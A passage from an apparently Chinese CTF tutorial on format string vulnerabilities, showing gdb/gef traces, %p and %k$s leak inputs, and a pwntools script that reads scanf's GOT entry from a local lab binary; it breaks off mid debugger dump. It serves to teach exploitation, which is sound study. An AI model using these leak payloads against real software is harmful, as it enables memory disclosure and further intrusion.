printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325 \n(\n%s\n?\n)\n     \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\n%s\n[\nInferior \n1\n \n(\nprocess \n57488\n)\n exited normally\n]\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u7b2c\u4e8c\u6b21\u6267\u884cprintf\u51fd\u6570\u7684\u65f6\u5019\uff0c\u786e\u5b9e\u662f\u5c060xffffcd04\u5904\u7684\u53d8\u91cf\u89c6\u4e3a\u5b57\u7b26\u4e32\u53d8\u91cf\uff0c\u8f93\u51fa\u4e86\u5176\u6570\u503c\u6240\u5bf9\u5e94\u7684\u5730\u5740\u5904\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u6837\u7684\u90fd\u4f1a\u6b63\u5e38\u8fd0\u884c\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e0d\u80fd\u591f\u88ab\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u90a3\u4e48\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u5d29\u6e83\u3002\n\n\n\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u83b7\u53d6\u6808\u4e0a\u7b2c\u51e0\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u6bd4\u5982\u6211\u4eec\u6307\u5b9a\u7b2cprintf\u7684\u7b2c3\u4e2a\u53c2\u6570\uff0c\u5982\u4e0b\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c31\u4e0d\u80fd\u591f\u89e3\u6790\uff0c\u5c31\u5d29\u6e83\u4e86\u3002\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\n%2\n$s\n\n\n00000001\n.22222222.ffffffff.%2\n$s\n\n\n[\n1\n]\n    \n57534\n segmentation fault \n(\ncore dumped\n)\n  ./leakmemory\n\n\n\n\n\u5c0f\u6280\u5de7\u603b\u7ed3\n\n\n\n\n\n\n\u5229\u7528%x\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528%p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002\n\n\n\u5229\u7528%s\u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002\n\n\n\u5229\u7528%order$x\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order$s\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002\n\n\n\n\n\n\n\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u4e0a\u9762\u65e0\u8bba\u662f\u6cc4\u9732\u6808\u4e0a\u8fde\u7eed\u7684\u53d8\u91cf\uff0c\u8fd8\u662f\u8bf4\u6cc4\u9732\u6307\u5b9a\u7684\u53d8\u91cf\u503c\uff0c\u6211\u4eec\u90fd\u6ca1\u80fd\u5b8c\u5168\u63a7\u5236\u6211\u4eec\u6240\u8981\u6cc4\u9732\u7684\u53d8\u91cf\u7684\u5730\u5740\u3002\u8fd9\u6837\u7684\u6cc4\u9732\u56fa\u7136\u6709\u7528\uff0c\u53ef\u662f\u5374\u4e0d\u591f\u5f3a\u529b\u6709\u6548\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8981\u6cc4\u9732\u67d0\u4e00\u4e2alibc\u51fd\u6570\u7684got\u8868\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230\u5176\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\u4ee5\u53ca\u5176\u4ed6\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5019\uff0c\u80fd\u591f\u5b8c\u5168\u63a7\u5236\u6cc4\u9732\u67d0\u4e2a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u5c31\u663e\u5f97\u5f88\u91cd\u8981\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u7a76\u7adf\u80fd\u4e0d\u80fd\u8fd9\u6837\u505a\u5462\uff1f\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u7684\u5566\u3002\n\n\n\u6211\u4eec\u518d\u4ed4\u7ec6\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\uff0c\u6211\u4eec\u6240\u8bfb\u53d6\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5728\u6808\u4e0a\u7684\uff08\u56e0\u4e3a\u662f\u67d0\u4e2a\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u672c\u4f8b\u4e2ds\u662fmain\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff09\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8c03\u7528\u8f93\u51fa\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\u5176\u5b9e\u5c31\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u6211\u4eec\u9009\u62e9\u4e0a\u9762\u7684\u67d0\u4e2a\u51fd\u6570\u8c03\u7528\u4e3a\u4f8b\n\n\nBreakpoint \n1\n, __printf \n(\nformat\n=\n0xffffcd10 \n%s\n)\n at printf.c:28\n\n28\n  in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n code:i386 \n]\n\u2500\u2500\u2500\u2500\n   0xf7e44667 \nfprintf+23\n     inc    DWORD PTR \n[\nebx+0x66c31cc4\n]\n\n   0xf7e4466d                  nop\n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325 \n(\n%s\n?\n)\n\n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325 \n(\n%s\n?\n)\n     \u2190 \n$eax\n\n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n0xffffcd18\u2502+0x1c: 0x000000e0\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u5728\u6808\u4e0a\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57400xffffcd10\uff0c\u540c\u65f6\u8be5\u5730\u5740\u5b58\u50a8\u7684\u4e5f\u786e\u5b9e\u662f\u662f\"%s\"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002\n\n\n\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u8f93\u51fa\u51fd\u6570\u8c03\u7528\u65f6\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd9\u91cc\u5047\u8bbe\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u4e3a\u7b2ck\u4e2a\u53c2\u6570\u3002\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9\u3002\n\n\naddr%k$s\n\n\n\n\n\n\n\u6ce8\uff1a \u5728\u8fd9\u91cc\uff0c\u5982\u679c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u6808\u4e0a\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e00\u5b9a\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\u6808\u6307\u9488\u81f3\u5c11\u4f4e\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57408\u5b57\u8282\u6216\u800516\u5b57\u8282\u3002\n\n\n\n\n\u4e0b\u9762\u5c31\u662f\u5982\u4f55\u786e\u5b9a\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a\u7b2c\u51e0\u4e2a\u53c2\u6570\u7684\u95ee\u9898\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u786e\u5b9a\n\n\n[tag]%p%p%p%p%p%p...\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u91cd\u590d\u67d0\u4e2a\u5b57\u7b26\u7684\u673a\u5668\u5b57\u957f\u6765\u4f5c\u4e3atag\uff0c\u800c\u540e\u9762\u4f1a\u8ddf\u4e0a\u82e5\u5e72\u4e2a%p\u6765\u8f93\u51fa\u6808\u4e0a\u7684\u5185\u5bb9\uff0c\u5982\u679c\u5185\u5bb9\u4e0e\u6211\u4eec\u524d\u9762\u7684tag\u91cd\u590d\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u5f88\u5927\u628a\u63e1\u8bf4\u660e\u8be5\u5730\u5740\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u4e4b\u6240\u4ee5\u8bf4\u662f\u6709\u5f88\u5927\u628a\u63e1\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e0d\u6392\u9664\u6808\u4e0a\u6709\u4e00\u4e9b\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u8be5\u6570\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6781\u5176\u5c11\u89c1\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66f4\u6362\u5176\u4ed6\u5b57\u7b26\u8fdb\u884c\u5c1d\u8bd5\uff0c\u8fdb\u884c\u518d\u6b21\u786e\u8ba4\u3002\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5b57\u7b26'A'\u4f5c\u4e3a\u7279\u5b9a\u5b57\u7b26\uff0c\u540c\u65f6\u8fd8\u662f\u5229\u7528\u4e4b\u524d\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f\uff0c\u5982\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\nAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n\n00000001\n.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\nAAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%\n\n\n\n\n\u75310x41414141\u5904\u6240\u5728\u7684\u4f4d\u7f6e\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u6b63\u597d\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c5\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c4\u4e2a\u53c2\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e00\u4e0b\n\n\n\u279c  leakmemory git:\n(\nmaster\n)\n \u2717 ./leakmemory\n%4\n$s\n\n\n00000001\n.22222222.ffffffff.%4\n$s\n\n\n[\n1\n]\n    \n61439\n segmentation fault \n(\ncore dumped\n)\n  ./leakmemory\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bd5\u56fe\u5c06\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u503c\u4f5c\u4e3a\u5730\u5740\u8fdb\u884c\u89e3\u6790\uff0c\u4f46\u662f\u663e\u7136\u8be5\u503c\u6ca1\u6709\u529e\u6cd5\u4f5c\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u88ab\u89e3\u6790\uff0c\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u5d29\u6e83\u4e86\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8c03\u8bd5\u3002\n\n\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret\n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffcd0c\n, \nl8\n]\n\n\n8\n\n0xffffcd0c\u2502+0x00: 0x080484ce  \u2192  \nmain+99\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd10\u2502+0x04: 0xffffcd20  \u2192  \n%4\n$s\n\n0xffffcd14\u2502+0x08: 0xffffcd20  \u2192  \n%4\n$s\n\n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd20\u2502+0x14: \n%4\n$s\n     \u2190 \n$eax\n\n0xffffcd24\u2502+0x18: 0xffffce00  \u2192  0x00000000\n0xffffcd28\u2502+0x1c: 0x000000e0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd20 \n%4$s\n)\n\n\n[\n#1] 0x80484ce \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  \nhelp\n x/\nExamine memory: x/FMT ADDRESS.\nADDRESS is an expression \nfor\n the memory address to examine.\nFMT is a repeat count followed by a format letter and a size letter.\nFormat letters are o\n(\noctal\n)\n, x\n(\nhex\n)\n, d\n(\ndecimal\n)\n, u\n(\nunsigned decimal\n)\n,\n  t\n(\nbinary\n)\n, f\n(\nfloat\n)\n, a\n(\naddress\n)\n, i\n(\ninstruction\n)\n, c\n(\nchar\n)\n, s\n(\nstring\n)\n\n  and z\n(\nhex, zero padded on the left\n)\n.\nSize letters are b\n(\nbyte\n)\n, h\n(\nhalfword\n)\n, w\n(\nword\n)\n, g\n(\ngiant, \n8\n bytes\n)\n.\nThe specified number of objects of the specified size are printed\naccording to the format.\n\nDefaults \nfor\n format and size letters are those previously used.\nDefault count is \n1\n.  Default address is following last thing printed\nwith this \ncommand\n or \nprint\n.\ngef\u27a4  x/x 0xffffcd20\n0xffffcd20: 0x73243425\ngef\u27a4  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804b000 0x0806c000 0x00000000 rw- \n[\nheap\n]\n\n0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7fb1000 0x00000000 rw-\n0xf7fd3000 0xf7fd5000 0x00000000 rw-\n0xf7fd5000 0xf7fd7000 0x00000000 r-- \n[\nvvar\n]\n\n0xf7fd7000 0xf7fd9000 0x00000000 r-x \n[\nvdso\n]\n\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rw-\n0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so\n0xffedd000 0xffffe000 0x00000000 rw- \n[\nstack\n]\n\ngef\u27a4  x/x 0x73243425\n0x73243425: Cannot access memory at address 0x73243425\n\n\n\n\n\u663e\u71360xffffcd20\u5904\u6240\u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u53d8\u91cf\u503c0x73243425\u5e76\u4e0d\u80fd\u591f\u88ab\u6539\u7a0b\u5e8f\u8bbf\u95ee\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u81ea\u7136\u5d29\u6e83\u4e86\u3002\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684\u5730\u5740\u5462\uff1f\u6bd4\u5982\u8bf4scanf@got\uff0c\u7ed3\u679c\u4f1a\u600e\u4e48\u6837\u5462\uff1f\u5e94\u8be5\u81ea\u7136\u662f\u8f93\u51fascanf\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u6211\u4eec\u4e0d\u59a8\u6765\u8bd5\u4e00\u4e0b\u3002\n\n\n\u9996\u5148\uff0c\u83b7\u53d6scanf@got\u7684\u5730\u5740\uff0c\u5982\u4e0b\n\n\n\n\n\u8fd9\u91cc\u4e4b\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528printf\u51fd\u6570\uff0c\u662f\u56e0\u4e3ascanf\u51fd\u6570\u4f1a\u5bf90a\uff0c0b\uff0c0c\uff0c00\u7b49\u5b57\u7b26\u6709\u4e00\u4e9b\u5947\u602a\u7684\u5904\u7406\uff0c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u8bfb\u5165\uff0c\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u8bd5\u8bd5\u3002\u3002\u3002\u3002\n\n\n\n\ngef\u27a4  got\n\n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE\n08049ffc R_386_GLOB_DAT    __gmon_start__\n0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0\n0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\n0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u5229\u7528pwntools\u6784\u9020payload\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nsh\n \n=\n \nprocess\n(\n./leakmemory\n)\n\n\nleakmemory\n \n=\n \nELF\n(\n./leakmemory\n)\n\n\n__isoc99_scanf_got\n \n=\n \nleakmemory\n.\ngot\n[\n__isoc99_scanf\n]\n\n\nprint\n \nhex\n(\n__isoc99_scanf_got\n)\n\n\npayload\n \n=\n \np32\n(\n__isoc99_scanf_got\n)\n \n+\n \n%4$s\n\n\nprint\n \npayload\n\n\ngdb\n.\nattach\n(\nsh\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecvuntil\n(\n%4$s\n\\n\n)\n\n\nprint\n \nhex\n(\nu32\n(\nsh\n.\nrecv\n()[\n4\n:\n8\n]))\n \n# remove the first bytes of __isoc99_scanf@got\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5176\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528gdb.attach(sh)\u6765\u8fdb\u884c\u8c03\u8bd5\u3002\u5f53\u6211\u4eec\u8fd0\u884c\u5230\u7b2c\u4e8c\u4e2aprintf\u51fd\u6570\u7684\u65f6\u5019(\u8bb0\u5f97\u4e0b\u65ad\u70b9)\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u7b2c\u56db\u4e2a\u53c2\u6570\u786e\u5b9e\u6307\u5411\u6211\u4eec\u7684scanf\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u8f93\u51fa\n\n\n \n\u2192\n \n0xf7615670\n \nprintf\n+\n0\n       \ncall\n   \n0xf76ebb09\n \n__x86\n.\nget_pc_thunk\n.\nax\n\n   \n\u21b3\n  \n0xf76ebb09\n \n__x86\n.\nget_pc_thunk\n.\nax\n+\n0\n \nmov\n    \neax\n,\n \nDWORD\n \nPTR\n \n[\nesp\n]\n\n      \n0xf76ebb0c\n \n__x86\n.\nget_pc_thunk\n.\nax\n+\n3\n \nret\n\n      \n0xf76ebb0d\n \n__x86\n.\nget_pc_thunk\n.\ndx\n+\n0\n \nmov\n    \nedx\n,\n \nDWORD\n \nPTR\n \n[\nesp\n]\n\n      \n0xf76ebb10\n \n__x86\n.\nget_pc_thunk\n.\ndx\n+\n3\n \nret\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0xffbbf8dc\n,\n \nl8\n]\n\n\n8\n\n\n0xffbbf8dc\n\u2502\n+\n0x00\n:\n \n0x080484ce\n  \n\u2192\n  \nmain\n+\n99\n \nadd\n \nesp\n,\n \n0x10\n     \n\u2190\n \n$\nesp\n\n\n0xffbbf8e0\n\u2502\n+\n0x04\n:\n \n0xffbbf8f0\n  \n\u2192\n  \n0x0804a014\n  \n\u2192\n  \n0xf76280c0\n  \n\u2192\n  \n__isoc99_scanf\n+\n0\n \npush\n \nebp\n\n\n0xffbbf8e4\n\u2502\n+\n0x08\n:\n \n0xffbbf8f0\n  \n\u2192\n  \n0x0804a014\n  \n\u2192\n  \n0xf76280c0\n  